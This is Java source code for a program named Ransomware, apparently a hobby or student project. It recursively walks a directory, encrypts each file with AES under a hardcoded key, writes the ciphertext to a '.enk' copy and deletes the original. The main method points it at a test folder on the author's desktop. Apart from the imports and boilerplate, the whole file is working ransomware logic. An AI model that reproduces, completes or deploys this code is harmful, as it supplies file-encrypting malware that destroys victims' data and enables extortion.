/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package ransomware;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.OutputStream;
import java.nio.file.Files;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;

/**
 *
 * @author benchek
 */
public class Ransomware {
    public static void encFile(String PathFile) throws IOException, NoSuchAlgorithmException, InvalidKeyException, NoSuchPaddingException, IllegalBlockSizeException, BadPaddingException{
        File file =new File(PathFile);
      byte[] fileContent = Files.readAllBytes(file.toPath());
        AESAlgo aESAlgo = new AESAlgo("khalil@04011998@");
        byte [] enc = aESAlgo.encrypt(fileContent);
       // byte [] dec=aESAlgo.decrypt(enc);
         OutputStream os= new FileOutputStream(new File(PathFile+".enk"));
            os.write(enc); 
            file.delete();
    }

    public static void ListFiles(String path) throws IOException, NoSuchAlgorithmException, InvalidKeyException, NoSuchPaddingException, IllegalBlockSizeException, BadPaddingException{
        String[] pathnames;
        File f = new File(path);
        pathnames = f.list();
        for (String pathname : pathnames) {
            System.out.println(pathname);
            if(!pathname.contains(".")){
            ListFiles(path+"\\"+pathname);
            }else{
                 encFile(path+"\\"+pathname);
            }
        }
    }
    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) throws NoSuchAlgorithmException, InvalidKeyException, NoSuchPaddingException, IllegalBlockSizeException, BadPaddingException, IOException {
        // TODO code application logic here  
      //  String path="C:\\Users\\benchek\\Desktop\\testenc\\g.txt";
      // 
        ListFiles("C:\\Users\\benchek\\Desktop\\testenc");
       
    }

}
